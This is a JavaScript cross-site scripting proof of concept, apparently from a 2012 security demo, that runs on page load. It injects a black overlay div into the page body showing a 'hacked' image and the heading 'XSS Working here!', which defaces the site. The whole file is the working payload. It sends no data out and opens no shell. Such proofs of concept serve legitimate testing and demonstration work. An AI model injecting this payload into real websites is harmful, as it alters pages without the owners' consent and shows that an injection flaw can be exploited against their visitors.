// XSS PoC
// From Mario Robles
// SmartInvaders 2012
var deface_start = "<div style='text-align:center; "+
	"background-color:black;"+
	"color:#FFF; "+
	"position:absolute; "+
	"top:120px; "+
	"bottom:30px; "+
	"right: 0; "+
	"left: 0; "+
	"margin:0 auto; "+
	"width:600px; "+
	"overflow:auto;'>";
var deface_content = "";
var deface_end = "</div>";


defacepage();
//alert("See XSS Working");

function addElement(idname) {
	var _body = document.getElementsByTagName('body') [0];
	var newdiv = document.createElement('div');
	newdiv.setAttribute('id',idname);
	_body.appendChild(newdiv);
}
function defacepage(){
	addElement("defacement");
	var defacement = document.getElementById('defacement');
	deface_content = "<img src='%baseurl%/i/hacked.jpg' /><br/><h1>XSS Working here!</h1>";
	defacement.innerHTML = deface_start+deface_content+deface_end;
}

